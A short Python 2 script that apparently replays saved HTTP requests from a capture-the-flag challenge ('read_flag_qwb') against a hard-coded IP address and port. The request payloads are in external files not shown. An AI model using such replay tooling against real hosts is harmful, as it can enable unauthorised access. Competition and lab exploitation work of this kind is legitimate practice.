#!/usr/bin/env python

from new_replay import *
import requests
import hashlib
import time

target = '47.105.121.116'
target_port = 8801
my_hash = hashlib.md5('xxxx' + str(target) + str(target_port) + str(time.time())).hexdigest()
file_dir = 'seq/read_flag_qwb/'
s = requests.session()

request_1 = open(file_dir + '1.txt').read()
reply_1 = send_http(s,parse_http(request_1),target,target_port)
# print reply_1[1]

request_2 = open(file_dir + '2.txt').read()
request_2 = request_2.replace('{{cookie}}','')
request_2 = request_2.replace('{{token}}','')
print parse_http(request_2)
exit()
reply_2 = send_http(s,parse_http(request_2),target,target_port)
print reply_2[1]

request_3 = open(file_dir + '3.txt').read()
request_3 = request_3.replace('{{cookie}}','')
reply_3 = send_http(s,parse_http(request_3),target,target_port)
print reply_3[1]

